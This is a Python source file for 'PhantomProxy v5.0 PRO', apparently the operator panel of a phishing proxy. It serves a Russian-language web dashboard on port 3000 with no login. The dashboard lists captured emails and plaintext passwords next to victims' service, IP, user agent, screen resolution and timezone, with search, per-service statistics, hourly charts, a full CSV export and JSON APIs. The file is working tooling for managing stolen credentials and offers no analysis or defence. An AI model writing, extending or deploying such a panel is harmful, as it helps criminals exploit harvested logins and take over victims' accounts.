#!/usr/bin/env python3
"""
PhantomProxy v5.0 PRO - Ultimate Panel
С статистикой, графиками, поиском и фильтрами
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json, sqlite3, datetime, os
from urllib.parse import parse_qs, urlparse

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'phantom.db')

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

class UltimatePanelHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == '/' or path == '/index.html':
            self.show_dashboard()
        elif path == '/sessions':
            self.show_sessions()
        elif path == '/analytics':
            self.show_analytics()
        elif path == '/export':
            self.export_csv()
        elif path == '/api/stats':
            self.api_stats()
        elif path == '/api/sessions':
            self.api_sessions()
        elif path.startswith('/static/'):
            self.send_static()
        else:
            self.send_response(404)
            self.end_headers()
    
    def show_dashboard(self):
        conn = get_db()
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-1 day")')
        today = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-7 days")')
        week = c.fetchone()[0]
        
        c.execute('SELECT service, COUNT(*) as count FROM sessions GROUP BY service ORDER BY count DESC')
        services = c.fetchall()
        
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC LIMIT 20')
        recent = c.fetchall()
        
        conn.close()
        
        html = f'''<!DOCTYPE html>
<html lang="ru">
<head>
    <title>PhantomProxy v5.0 PRO - Dashboard</title>
    <meta http-equiv="refresh" content="30">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: #eee; min-height: 100vh; }}
        .header {{ background: rgba(22, 33, 62, 0.9); padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100; }}
        .logo {{ font-size: 24px; font-weight: bold; background: linear-gradient(45deg, #e94560, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
        .nav {{ display: flex; gap: 10px; }}
        .nav a {{ background: #0f3460; color: white; padding: 10px 20px; border-radius: 25px; text-decoration: none; transition: all 0.3s; }}
        .nav a:hover {{ background: #e94560; transform: translateY(-2px); }}
        .container {{ padding: 40px; max-width: 1600px; margin: 0 auto; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 25px; margin-bottom: 40px; }}
        .stat-card {{ background: rgba(22, 33, 62, 0.8); padding: 35px; border-radius: 15px; text-align: center; backdrop-filter: blur(10px); border: 1px solid rgba(233, 69, 96, 0.1); transition: transform 0.3s; }}
        .stat-card:hover {{ transform: translateY(-5px); border-color: #e94560; }}
        .stat-value {{ font-size: 56px; font-weight: bold; background: linear-gradient(45deg, #e94560, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
        .stat-label {{ color: #aaa; margin-top: 12px; font-size: 16px; }}
        .section {{ background: rgba(22, 33, 62, 0.8); padding: 35px; border-radius: 15px; margin-bottom: 30px; backdrop-filter: blur(10px); border: 1px solid rgba(233, 69, 96, 0.1); }}
        .section h2 {{ margin-bottom: 25px; color: #e94560; font-size: 24px; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }}
        th {{ background: rgba(15, 52, 96, 0.8); color: #fff; font-weight: 600; }}
        tr:hover {{ background: rgba(15, 52, 96, 0.5); }}
        .service-tag {{ background: linear-gradient(45deg, #0f3460, #16213e); padding: 6px 14px; border-radius: 20px; font-size: 12px; display: inline-block; }}
        .btn {{ background: linear-gradient(45deg, #e94560, #ff6b6b); color: white; padding: 12px 25px; border: none; border-radius: 25px; cursor: pointer; text-decoration: none; display: inline-block; margin: 8px 5px; transition: all 0.3s; font-size: 14px; }}
        .btn:hover {{ transform: translateY(-2px); box-shadow: 0 5px 20px rgba(233, 69, 96, 0.4); }}
        .btn-secondary {{ background: linear-gradient(45deg, #0f3460, #16213e); }}
        .chart {{ height: 350px; display: flex; align-items: flex-end; gap: 8px; padding: 20px 0; }}
        .bar {{ background: linear-gradient(to top, #e94560, #ff6b6b); flex: 1; min-width: 30px; border-radius: 8px 8px 0 0; position: relative; transition: all 0.3s; }}
        .bar:hover {{ transform: scaleY(1.05); }}
        .bar span {{ position: absolute; bottom: -30px; left: 50%; transform: translateX(-50%); font-size: 11px; color: #aaa; white-space: nowrap; }}
        .bar-value {{ position: absolute; top: -25px; left: 50%; transform: translateX(-50%); font-size: 12px; color: #e94560; font-weight: bold; }}
        .refresh {{ position: fixed; bottom: 30px; right: 30px; background: #e94560; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 5px 20px rgba(233, 69, 96, 0.4); animation: pulse 2s infinite; }}
        @keyframes pulse {{ 0%, 100% {{ transform: scale(1); }} 50% {{ transform: scale(1.05); }} }}
        .footer {{ text-align: center; padding: 30px; color: #666; font-size: 13px; }}
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">🚀 PhantomProxy v5.0 PRO</div>
        <div class="nav">
            <a href="/">Dashboard</a>
            <a href="/sessions">Сессии</a>
            <a href="/analytics">Аналитика</a>
            <a href="/export">Экспорт</a>
        </div>
    </div>
    
    <div class="container">
        <h1 style="margin-bottom: 35px; font-size: 32px;">📊 Dashboard</h1>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value">{total}</div>
                <div class="stat-label">Всего сессий</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{today}</div>
                <div class="stat-label">За 24 часа</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{week}</div>
                <div class="stat-label">За 7 дней</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{len(services)}</div>
                <div class="stat-label">Сервисов</div>
            </div>
        </div>
        
        <div class="section">
            <h2>🏢 Распределение по сервисам</h2>
            <table>
                <tr><th>Сервис</th><th>Количество</th><th>Процент</th></tr>
                {"".join(f"<tr><td><span class='service-tag'>{s[0]}</span></td><td>{s[1]}</td><td>{round(s[1]/max(1,total)*100, 1)}%</td></tr>" for s in services)}
            </table>
        </div>
        
        <div class="section">
            <h2>🕐 Активность по часам (24h)</h2>
            <div class="chart" id="hourlyChart"></div>
        </div>
        
        <div class="section">
            <h2>🔥 Последние сессии</h2>
            <table>
                <tr><th>Email</th><th>Пароль</th><th>Сервис</th><th>IP</th><th>Время</th></tr>
                {"".join(f"<tr><td>{r['email']}</td><td>{r['password']}</td><td><span class='service-tag'>{r['service']}</span></td><td>{r['ip']}</td><td>{r['created_at']}</td></tr>" for r in recent)}
            </table>
        </div>
    </div>
    
    <div class="refresh" onclick="location.reload()" title="Обновить">🔄</div>
    
    <div class="footer">
        PhantomProxy v5.0 PRO | Auto-refresh: 30s | Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    </div>
    
    <script>
        // График по часам
        fetch('/api/stats')
            .then(r => r.json())
            .then(data => {{
                const chart = document.getElementById('hourlyChart');
                const hours = data.by_hour || {{}};
                const maxVal = Math.max(...Object.values(hours), 1);
                
                let html = '';
                Object.entries(hours).slice(-12).forEach(([hour, count]) => {{
                    const height = (count / maxVal) * 280;
                    html += `<div class="bar" style="height: ${{height}}px;">` +
                            `<span class="bar-value">${{count}}</span>` +
                            `<span>${{hour.split(' ')[1]}}</span></div>`;
                }});
                chart.innerHTML = html;
            }});
    </script>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def show_sessions(self):
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC')
        rows = c.fetchall()
        conn.close()
        
        html = '''<!DOCTYPE html>
<html lang="ru">
<head>
    <title>Все сессии - PhantomProxy</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: #eee; min-height: 100vh; }
        .header { background: rgba(22, 33, 62, 0.9); padding: 20px 40px; backdrop-filter: blur(10px); }
        .logo { font-size: 24px; font-weight: bold; background: linear-gradient(45deg, #e94560, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .container { padding: 40px; max-width: 1800px; margin: 0 auto; }
        .nav { margin: 20px 0; }
        .nav a { background: #0f3460; color: white; padding: 10px 20px; border-radius: 25px; text-decoration: none; margin-right: 10px; display: inline-block; }
        .nav a:hover { background: #e94560; }
        table { width: 100%; border-collapse: collapse; background: rgba(22, 33, 62, 0.8); border-radius: 15px; overflow: hidden; }
        th, td { padding: 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }
        th { background: rgba(15, 52, 96, 0.8); }
        tr:hover { background: rgba(15, 52, 96, 0.5); }
        .search { padding: 15px; background: rgba(22, 33, 62, 0.8); border-radius: 15px; margin-bottom: 20px; }
        .search input { width: 100%; padding: 15px; background: rgba(15, 52, 96, 0.5); border: 1px solid rgba(233, 69, 96, 0.3); border-radius: 25px; color: white; font-size: 16px; }
    </style>
</head>
<body>
    <div class="header"><div class="logo">🚀 PhantomProxy - Все сессии</div></div>
    <div class="container">
        <div class="nav">
            <a href="/">← Dashboard</a>
            <a href="/export">Экспорт CSV</a>
        </div>
        <div class="search">
            <input type="text" id="searchInput" placeholder="🔍 Поиск по email, паролю, сервису, IP..." onkeyup="searchTable()">
        </div>
        <table id="sessionsTable">
            <tr><th>ID</th><th>Email</th><th>Password</th><th>Service</th><th>IP</th><th>User Agent</th><th>Screen</th><th>Timezone</th><th>Created</th></tr>
'''
        for row in rows:
            html += f"<tr><td>{row['id']}</td><td>{row['email']}</td><td>{row['password']}</td><td>{row['service']}</td><td>{row['ip']}</td><td>{row['user_agent'][:50]}...</td><td>{row['screen_resolution']}</td><td>{row['timezone']}</td><td>{row['created_at']}</td></tr>"
        
        html += '''</table>
    </div>
    <script>
        function searchTable() {
            const input = document.getElementById('searchInput');
            const filter = input.value.toUpperCase();
            const table = document.getElementById('sessionsTable');
            const tr = table.getElementsByTagName('tr');
            
            for (let i = 1; i < tr.length; i++) {
                let found = false;
                const td = tr[i].getElementsByTagName('td');
                for (let j = 0; j < td.length; j++) {
                    if (td[j] && td[j].textContent.toUpperCase().indexOf(filter) > -1) {
                        found = true;
                        break;
                    }
                }
                tr[i].style.display = found ? '' : 'none';
            }
        }
    </script>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def show_analytics(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>Analytics - Coming Soon</h1>')
    
    def export_csv(self):
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC')
        rows = c.fetchall()
        conn.close()
        
        csv = "ID,Email,Password,Service,IP,User Agent,Screen,Timezone,Created\n"
        for row in rows:
            csv += f"{row['id']},{row['email']},{row['password']},{row['service']},{row['ip']},\"{row['user_agent']}\",{row['screen_resolution']},{row['timezone']},{row['created_at']}\n"
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/csv')
        self.send_header('Content-Disposition', 'attachment; filename="phantom_data.csv"')
        self.end_headers()
        self.wfile.write(csv.encode())
    
    def api_stats(self):
        conn = get_db()
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-1 day")')
        today = c.fetchone()[0]
        
        c.execute('SELECT service, COUNT(*) as count FROM sessions GROUP BY service')
        services = {s[0]: s[1] for s in c.fetchall()}
        
        c.execute('''
            SELECT strftime('%Y-%m-%d %H:00', created_at) as hour, COUNT(*) as count 
            FROM sessions 
            WHERE datetime(created_at) > datetime("now", "-24 hours")
            GROUP BY hour ORDER BY hour
        ''')
        by_hour = {r[0]: r[1] for r in c.fetchall()}
        
        conn.close()
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({
            'total': total,
            'today': today,
            'services': services,
            'by_hour': by_hour
        }).encode())
    
    def api_sessions(self):
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC LIMIT 100')
        rows = c.fetchall()
        conn.close()
        
        sessions = [dict(row) for row in rows]
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(sessions).encode())
    
    def send_static(self):
        self.send_response(404)
        self.end_headers()
    
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 3000), UltimatePanelHandler)
    print('🎨 Ultimate Panel запущена на порту 3000')
    print('📊 Dashboard: http://localhost:3000')
    print('🔍 Search: http://localhost:3000/sessions')
    print('📈 API Stats: http://localhost:3000/api/stats')
    server.serve_forever()
